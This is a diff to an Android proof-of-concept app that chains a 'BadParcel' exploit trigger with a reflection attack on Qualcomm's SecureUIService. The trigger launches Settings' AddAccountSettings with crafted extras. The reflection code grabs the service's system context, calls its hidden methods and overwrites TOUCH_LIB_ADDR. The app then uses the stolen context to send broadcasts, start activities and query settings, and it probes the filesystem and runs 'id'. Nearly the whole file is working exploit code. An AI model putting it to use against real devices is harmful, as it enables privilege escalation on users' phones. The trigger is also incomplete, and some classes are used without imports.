@@ -1,6 +1,8 @@
 package com.example.tzpoc;
 
 import android.Manifest;
+import android.accounts.AccountManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -19,13 +21,14 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.lang.reflect.Modifier;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -44,7 +47,7 @@ public class MainActivity extends AppCompatActivity {
     private AtomicBoolean stopRequested = new AtomicBoolean(false);
     private Thread testThread;
 
-    // 取得したシステムコンテキスト（SecureUIService.context）
+    // SecureUI リフレクション用
     private Context systemContext;
     private Class<?> secureUIClass;
 
@@ -64,9 +67,9 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(true);
                 enableButtons(false, true);
                 stopRequested.set(false);
-                // 多段階でSecureUIクラスをロード試行
-                attemptLoadSecureUIClass();
-                startTests();
+                // 別スレッドで実行
+                testThread = new Thread(() -> executeFullTest());
+                testThread.start();
             }
         });
         btnStop.setOnClickListener(v -> {
@@ -81,14 +84,17 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(false);
             }
         });
-        appendLog("SecureUI Deep PoC started. Press 'Start'.");
+        appendLog("SecureUI + BadParcel PoC started. Press 'Start'.");
     }
 
     private void requestPermissions() {
         String[] perms = {
                 Manifest.permission.READ_EXTERNAL_STORAGE,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.ACCESS_FINE_LOCATION
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.GET_ACCOUNTS,
+                Manifest.permission.MANAGE_ACCOUNTS,
+                Manifest.permission.AUTHENTICATE_ACCOUNTS
         };
         for (String p : perms) {
             if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
@@ -98,137 +104,28 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ========== 多段階クラスロード試行 ==========
-    private void attemptLoadSecureUIClass() {
-        appendLog("--- Attempting to load SecureUIService class ---");
-
-        // 方法1: デフォルトクラスローダ（通常は失敗）
-        try {
-            secureUIClass = Class.forName(SECUREUI_CLASS);
-            appendLog("Method1: Class.forName succeeded");
-        } catch (ClassNotFoundException e) {
-            appendLog("Method1 failed: " + e.getMessage());
-        }
-
-        // 方法2: システムクラスローダ
-        if (secureUIClass == null) {
-            try {
-                secureUIClass = Class.forName(SECUREUI_CLASS, true, ClassLoader.getSystemClassLoader());
-                appendLog("Method2: SystemClassLoader succeeded");
-            } catch (Exception e) {
-                appendLog("Method2 failed: " + e.getMessage());
-            }
-        }
-
-        // 方法3: 現在のコンテキストのクラスローダ（アプリのクラスローダと同じ）
-        if (secureUIClass == null) {
-            try {
-                secureUIClass = Class.forName(SECUREUI_CLASS, true, getClassLoader());
-                appendLog("Method3: App ClassLoader succeeded");
-            } catch (Exception e) {
-                appendLog("Method3 failed: " + e.getMessage());
-            }
-        }
-
-        // 方法4: createPackageContext で他パッケージのコンテキストを取得（権限不足で失敗する可能性大）
-        if (secureUIClass == null) {
-            try {
-                Context remoteContext = createPackageContext(SECUREUI_PKG,
-                        Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
-                secureUIClass = remoteContext.getClassLoader().loadClass(SECUREUI_CLASS);
-                appendLog("Method4: createPackageContext succeeded");
-            } catch (Exception e) {
-                appendLog("Method4 failed: " + e.getMessage());
-            }
-        }
-
-        // 方法5: ActivityThread のシステムコンテキストを取得（非公開API）
-        if (secureUIClass == null) {
-            try {
-                Class<?> activityThread = Class.forName("android.app.ActivityThread");
-                Method currentActivityThread = activityThread.getMethod("currentActivityThread");
-                Object thread = currentActivityThread.invoke(null);
-                Method getSystemContext = activityThread.getMethod("getSystemContext");
-                Context systemCtx = (Context) getSystemContext.invoke(thread);
-                secureUIClass = systemCtx.getClassLoader().loadClass(SECUREUI_CLASS);
-                appendLog("Method5: ActivityThread system context succeeded");
-            } catch (Exception e) {
-                appendLog("Method5 failed: " + e.getMessage());
-            }
-        }
-
-        // いずれも失敗した場合、クラスが見つからないことをログに記録
-        if (secureUIClass == null) {
-            appendLog("WARNING: Could not load SecureUIService class. All tests will likely fail.");
-            return;
-        }
-
-        // クラス取得成功後、context フィールドを取得
-        try {
-            Field contextField = secureUIClass.getDeclaredField("context");
-            contextField.setAccessible(true);
-            systemContext = (Context) contextField.get(null);
-            if (systemContext != null) {
-                appendLog("SecureUIService.context acquired: " + systemContext);
-            } else {
-                appendLog("SecureUIService.context is null (service not running in this process?)");
-            }
-        } catch (Exception e) {
-            appendLog("Failed to get context field: " + e.getMessage());
-            systemContext = null;
-        }
-    }
-
-    private void startTests() {
-        if (testThread != null && testThread.isAlive()) return;
-        testThread = new Thread(() -> executeFullTest());
-        testThread.start();
-    }
-
-    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
-        handler.post(() -> {
-            btnStart.setEnabled(startEnabled);
-            btnStop.setEnabled(stopEnabled);
-        });
-    }
-
-    // ==================== メインテスト ====================
+    // ========== メインテスト ==========
     private void executeFullTest() {
-        // Phase 1: クラスがロードできたか確認
-        appendLog("========== PHASE 1: Class Load Status ==========");
-        appendLog("secureUIClass = " + (secureUIClass != null ? secureUIClass.getName() : "null"));
-        appendLog("systemContext = " + (systemContext != null ? systemContext.toString() : "null"));
+        appendLog("========== PHASE 1: Trigger BadParcel Exploit ==========");
+        triggerBadParcel();
 
-        // Phase 2: 全フィールド列挙（staticのみ）
-        if (secureUIClass != null) {
-            appendLog("========== PHASE 2: Static Fields Enumeration ==========");
-            enumerateStaticFields();
+        // BadParcel の結果を確認（/data/local/tmp/badparcel_success が存在するか）
+        checkBadParcelResult();
 
-            // Phase 3: 全staticメソッド呼び出し（Native含む）
-            appendLog("========== PHASE 3: Static Method Invocation ==========");
-            invokeStaticMethods();
+        appendLog("========== PHASE 2: SecureUI Reflection Attempt ==========");
+        attemptSecureUIReflection();
 
-            // Phase 4: インスタンスメソッド呼び出し（contextインスタンスを使って）
-            appendLog("========== PHASE 4: Instance Method Invocation ==========");
-            invokeInstanceMethods();
-
-            // Phase 5: TOUCH_LIB_ADDR書き換え
-            appendLog("========== PHASE 5: TOUCH_LIB_ADDR Modification ==========");
-            manipulateTouchLibAddr();
-
-            // Phase 6: OrientationActivity起動（systemContext経由）
-            appendLog("========== PHASE 6: OrientationActivity Control ==========");
-            controlOrientationActivity();
+        appendLog("========== PHASE 3: System Context Verification ==========");
+        if (systemContext != null) {
+            testSystemContext();
         } else {
-            appendLog("SecureUIClass not loaded. Skipping Phase 2-6.");
+            appendLog("SystemContext not available.");
         }
 
-        // Phase 7: ファイルシステム探索（別途）
-        appendLog("========== PHASE 7: File System Exploration ==========");
+        appendLog("========== PHASE 4: File System Exploration ==========");
         exploreFiles();
 
-        // Phase 8: idコマンド
-        appendLog("========== PHASE 8: Process Context (id) ==========");
+        appendLog("========== PHASE 5: id Command ==========");
         runIdCommand();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -238,137 +135,111 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    // ---------- フィールド列挙 ----------
-    private void enumerateStaticFields() {
+    // ---------- BadParcel Exploit 発動 ----------
+    private void triggerBadParcel() {
         try {
-            Field[] fields = secureUIClass.getDeclaredFields();
-            for (Field f : fields) {
-                if (stopRequested.get()) break;
-                f.setAccessible(true);
-                int mod = f.getModifiers();
-                if (!Modifier.isStatic(mod)) continue; // staticのみ
-                String name = f.getName();
-                Class<?> type = f.getType();
-                Object value = null;
-                try {
-                    value = f.get(null);
-                } catch (Exception e) {
-                    value = "<error: " + e.getMessage() + ">";
-                }
-                appendLog("static " + type.getSimpleName() + " " + name + " = " + value);
-            }
+            // AccountAuthenticator を起動するための Intent
+            Intent attacker = new Intent();
+            attacker.setComponent(new ComponentName("com.android.settings",
+                    "com.android.settings.accounts.AddAccountSettings"));
+            attacker.setAction(Intent.ACTION_RUN);
+            attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            String[] authTypes = {getPackageName()};
+            attacker.putExtra("account_types", authTypes);
+            startActivity(attacker);
+            appendLog("BadParcel exploit triggered (AddAccountSettings started).");
         } catch (Exception e) {
-            appendLog("Enum fields error: " + e.getMessage());
+            appendLog("Failed to trigger BadParcel: " + e.getMessage());
         }
     }
 
-    // ---------- staticメソッド呼び出し ----------
-    private void invokeStaticMethods() {
-        // 呼び出すstaticメソッド一覧（メソッド名、引数型、ダミー引数）
-        Object[][] methods = {
-                {"init", new Class<?>[]{}, new Object[]{}},
-                {"terminate", new Class<?>[]{}, new Object[]{}},
-                {"sendNotification", new Class<?>[]{int.class, int.class, byte[].class}, new Object[]{2, 15, new byte[]{0,0,0,0,0,0}}},
-                {"setRotation", new Class<?>[]{int.class}, new Object[]{16}},
-        };
-        for (Object[] m : methods) {
-            if (stopRequested.get()) break;
-            String name = (String) m[0];
-            Class<?>[] paramTypes = (Class<?>[]) m[1];
-            Object[] args = (Object[]) m[2];
-            try {
-                Method method = secureUIClass.getDeclaredMethod(name, paramTypes);
-                method.setAccessible(true);
-                Object result = method.invoke(null, args);
-                appendLog("static " + name + "() -> " + result);
-            } catch (NoSuchMethodException e) {
-                appendLog("static " + name + " not found");
-            } catch (Exception e) {
-                appendLog("static " + name + " threw: " + e.getCause() != null ? e.getCause().getMessage() : e.getMessage());
-            }
-        }
-    }
-
-    // ---------- インスタンスメソッド呼び出し ----------
-    private void invokeInstanceMethods() {
-        if (systemContext == null) {
-            appendLog("systemContext is null, cannot invoke instance methods");
-            return;
-        }
-        // systemContextはSecureUIServiceのインスタンス（Contextのサブクラス）
-        // ただし、別プロセスの可能性があるため、リモートメソッド呼び出しは失敗する可能性大
-        Object instance = systemContext; // 実際にはSecureUIServiceインスタンス
-        // 呼び出すインスタンスメソッド（privateも含む）
-        String[] methodNames = {
-                "getSource", "getdispprop", "secuienqueue", "secuidequeue",
-                "startdisp", "stopdisp", "sendResponse"
-        };
-        for (String name : methodNames) {
-            if (stopRequested.get()) break;
-            try {
-                Method method = secureUIClass.getDeclaredMethod(name, new Class<?>[]{});
-                method.setAccessible(true);
-                Object result = method.invoke(instance);
-                appendLog("instance " + name + "() -> " + result);
-            } catch (NoSuchMethodException e) {
-                // 引数がある場合もあるので、引数ありのバージョンを試す
-                try {
-                    Method method = secureUIClass.getDeclaredMethod(name, int.class, int.class, byte[].class, byte[].class);
-                    method.setAccessible(true);
-                    Object result = method.invoke(instance, 0, 0, new byte[32], new byte[32]);
-                    appendLog("instance " + name + "(int,int,byte[],byte[]) -> " + result);
-                } catch (NoSuchMethodException ex) {
-                    appendLog("instance " + name + " not found");
-                } catch (Exception ex) {
-                    appendLog("instance " + name + " threw: " + ex.getCause() != null ? ex.getCause().getMessage() : ex.getMessage());
+    // ---------- BadParcel 結果確認 ----------
+    private void checkBadParcelResult() {
+        File successFile = new File("/data/local/tmp/badparcel_success");
+        if (successFile.exists()) {
+            appendLog("BadParcel seems successful! File exists: " + successFile.getAbsolutePath());
+            // 内容を読み取る
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(successFile)))) {
+                String line;
+                while ((line = br.readLine()) != null) {
+                    appendLog("badparcel_success content: " + line);
                 }
             } catch (Exception e) {
-                appendLog("instance " + name + " threw: " + e.getCause() != null ? e.getCause().getMessage() : e.getMessage());
+                appendLog("Failed to read badparcel_success: " + e.getMessage());
             }
-        }
-        // waitForMessage はブロッキングなので特別扱い（別スレッドでタイムアウト）
-        try {
-            Method waitMethod = secureUIClass.getDeclaredMethod("waitForMessage", byte[].class);
-            waitMethod.setAccessible(true);
-            byte[] input = new byte[32];
-            Thread t = new Thread(() -> {
-                try {
-                    Object result = waitMethod.invoke(instance, (Object) input);
-                    appendLog("waitForMessage returned: " + result);
-                } catch (Exception e) {
-                    appendLog("waitForMessage error: " + e.getMessage());
-                }
-            });
-            t.start();
-            t.join(2000); // 2秒待つ
-            if (t.isAlive()) {
-                t.interrupt();
-                appendLog("waitForMessage timed out (blocking)");
-            }
-        } catch (Exception e) {
-            appendLog("waitForMessage test error: " + e.getMessage());
+        } else {
+            appendLog("BadParcel result file not found. Exploit may have failed.");
         }
     }
 
-    // ---------- TOUCH_LIB_ADDR書き換え ----------
-    private void manipulateTouchLibAddr() {
+    // ---------- SecureUI リフレクション試行 ----------
+    private void attemptSecureUIReflection() {
+        appendLog("Attempting to load SecureUIService class...");
+        // 通常のクラスローダ
         try {
-            Field field = secureUIClass.getDeclaredField("TOUCH_LIB_ADDR");
-            field.setAccessible(true);
-            byte[] original = (byte[]) field.get(null);
-            appendLog("Original TOUCH_LIB_ADDR: " + bytesToHex(original));
-            byte[] malicious = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-            field.set(null, malicious);
-            appendLog("Modified TOUCH_LIB_ADDR to zeros");
-            // sendNotificationを呼び出して影響確認
-            Method sendNotif = secureUIClass.getMethod("sendNotification", int.class, int.class, byte[].class);
-            int result = (int) sendNotif.invoke(null, 2, 15, malicious);
-            appendLog("sendNotification with modified addr returned: " + result);
-            // 元に戻す
-            field.set(null, original);
-            appendLog("Restored TOUCH_LIB_ADDR");
-        } catch (Exception e) {
-            appendLog("TOUCH_LIB_ADDR manipulation error: " + e.getMessage());
+            secureUIClass = Class.forName(SECUREUI_CLASS);
+            appendLog("Class.forName succeeded.");
+        } catch (ClassNotFoundException e) {
+            appendLog("Class.forName failed: " + e.getMessage());
+            // 代替手段: システムクラスローダ
+            try {
+                secureUIClass = Class.forName(SECUREUI_CLASS, true, ClassLoader.getSystemClassLoader());
+                appendLog("SystemClassLoader succeeded.");
+            } catch (Exception ex) {
+                appendLog("SystemClassLoader failed: " + ex.getMessage());
+                // さらに createPackageContext
+                try {
+                    Context remoteCtx = createPackageContext(SECUREUI_PKG,
+                            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
+                    secureUIClass = remoteCtx.getClassLoader().loadClass(SECUREUI_CLASS);
+                    appendLog("createPackageContext succeeded.");
+                } catch (Exception ex2) {
+                    appendLog("All class loading attempts failed. SecureUI not accessible.");
+                    return;
+                }
+            }
+        }
+
+        if (secureUIClass != null) {
+            appendLog("SecureUIService class loaded: " + secureUIClass.getName());
+            // context フィールド取得
+            try {
+                Field contextField = secureUIClass.getDeclaredField("context");
+                contextField.setAccessible(true);
+                systemContext = (Context) contextField.get(null);
+                if (systemContext != null) {
+                    appendLog("SecureUIService.context acquired: " + systemContext);
+                } else {
+                    appendLog("SecureUIService.context is null (service not running?)");
+                }
+            } catch (Exception e) {
+                appendLog("Failed to get context field: " + e.getMessage());
+            }
+
+            // 静的メソッドを呼び出してみる
+            try {
+                Method setRotation = secureUIClass.getMethod("setRotation", int.class);
+                setRotation.invoke(null, 16);
+                appendLog("setRotation(16) called successfully.");
+            } catch (Exception e) {
+                appendLog("setRotation failed: " + e.getMessage());
+            }
+
+            // TOUCH_LIB_ADDR を書き換えてみる
+            try {
+                Field touchField = secureUIClass.getDeclaredField("TOUCH_LIB_ADDR");
+                touchField.setAccessible(true);
+                byte[] original = (byte[]) touchField.get(null);
+                appendLog("Original TOUCH_LIB_ADDR: " + bytesToHex(original));
+                byte[] malicious = {0x00,0x00,0x00,0x00,0x00,0x00};
+                touchField.set(null, malicious);
+                appendLog("TOUCH_LIB_ADDR modified to zeros.");
+                // 元に戻す
+                touchField.set(null, original);
+                appendLog("Restored TOUCH_LIB_ADDR.");
+            } catch (Exception e) {
+                appendLog("TOUCH_LIB_ADDR manipulation failed: " + e.getMessage());
+            }
         }
     }
 
@@ -378,48 +249,52 @@ public class MainActivity extends AppCompatActivity {
         return sb.toString();
     }
 
-    // ---------- OrientationActivity制御 ----------
-    private void controlOrientationActivity() {
+    // ---------- SystemContext テスト ----------
+    private void testSystemContext() {
+        appendLog("Testing systemContext capabilities...");
+        // ブロードキャスト送信
         try {
-            // 起動
-            Intent intent = new Intent();
-            intent.setClassName(SECUREUI_PKG, SECUREUI_PKG + ".OrientationActivity");
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            if (systemContext != null) {
-                systemContext.startActivity(intent);
-                appendLog("OrientationActivity started via systemContext");
-            } else {
-                startActivity(intent);
-                appendLog("OrientationActivity started via normal context (may fail)");
-            }
-            Thread.sleep(1000);
-            // 終了（ACTION_CLOSEブロードキャスト）
-            Intent closeIntent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
-            closeIntent.setPackage(SECUREUI_PKG);
-            if (systemContext != null) {
-                systemContext.sendBroadcast(closeIntent);
-                appendLog("ACTION_CLOSE sent via systemContext");
-            } else {
-                sendBroadcast(closeIntent);
-                appendLog("ACTION_CLOSE sent via normal context");
+            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
+            intent.setPackage(SECUREUI_PKG);
+            systemContext.sendBroadcast(intent);
+            appendLog("ACTION_CLOSE broadcast sent.");
+        } catch (Exception e) {
+            appendLog("Broadcast failed: " + e.getMessage());
+        }
+        // アクティビティ起動
+        try {
+            Intent settings = new Intent(Settings.ACTION_SETTINGS);
+            settings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            systemContext.startActivity(settings);
+            appendLog("Settings started via systemContext.");
+        } catch (Exception e) {
+            appendLog("StartActivity failed: " + e.getMessage());
+        }
+        // ContentProvider クエリ
+        try {
+            android.content.ContentResolver cr = systemContext.getContentResolver();
+            android.database.Cursor c = cr.query(android.provider.Settings.Global.CONTENT_URI,
+                    null, null, null, null);
+            if (c != null) {
+                appendLog("Settings.Global query succeeded, count=" + c.getCount());
+                c.close();
             }
         } catch (Exception e) {
-            appendLog("OrientationActivity control error: " + e.getMessage());
+            appendLog("ContentProvider query failed: " + e.getMessage());
         }
     }
 
     // ---------- ファイル探索 ----------
     private void exploreFiles() {
+        appendLog("Exploring filesystem...");
         File root = new File("/");
         File[] files = root.listFiles();
         if (files != null) {
-            appendLog("Root directory contents:");
-            for (File f : files) {
-                if (stopRequested.get()) break;
-                appendLog("  " + f.getAbsolutePath() + (f.isDirectory() ? "/" : ""));
+            appendLog("Root directory entries (first 20):");
+            for (int i = 0; i < Math.min(20, files.length); i++) {
+                appendLog("  " + files[i].getAbsolutePath());
             }
         }
-        // /data/local/tmp
         File tmp = new File("/data/local/tmp");
         if (tmp.exists() && tmp.canRead()) {
             appendLog("Contents of /data/local/tmp:");
@@ -427,13 +302,13 @@ public class MainActivity extends AppCompatActivity {
                 if (f != null) appendLog("  " + f.getName());
             }
         }
-        // /sdcard/Download に書き込みテスト
+        // 書き込みテスト
         File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
         if (download.exists() || download.mkdirs()) {
             File test = new File(download, "poc_test.txt");
             try (FileOutputStream fos = new FileOutputStream(test)) {
                 fos.write("Test write".getBytes());
-                appendLog("Write to " + test.getAbsolutePath() + " succeeded");
+                appendLog("Write to " + test.getAbsolutePath() + " succeeded.");
                 test.delete();
             } catch (Exception e) {
                 appendLog("Write to Download failed: " + e.getMessage());
@@ -441,8 +316,9 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // ---------- idコマンド ----------
+    // ---------- id コマンド ----------
     private void runIdCommand() {
+        appendLog("Executing 'id' command...");
         try {
             Process process = Runtime.getRuntime().exec("id");
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -452,7 +328,7 @@ public class MainActivity extends AppCompatActivity {
             process.waitFor();
             appendLog("id output:\n" + out.toString());
         } catch (Exception e) {
-            appendLog("id command error: " + e.getMessage());
+            appendLog("id command failed: " + e.getMessage());
         }
     }
 
@@ -475,11 +351,11 @@ public class MainActivity extends AppCompatActivity {
         try {
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists() && !dir.mkdirs()) return;
-            File file = new File(dir, "secureui_deep_poc_log.txt");
+            File file = new File(dir, "secureui_badparcel_poc_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
-                pw.println("=== SecureUI Deep PoC Log ===");
+                pw.println("=== SecureUI + BadParcel PoC Log ===");
                 pw.println("Timestamp: " + new Date());
-                pw.println("================================");
+                pw.println("=======================================");
                 pw.print(logBuilder.toString());
             }
             appendLog("Log saved to " + file.getAbsolutePath());
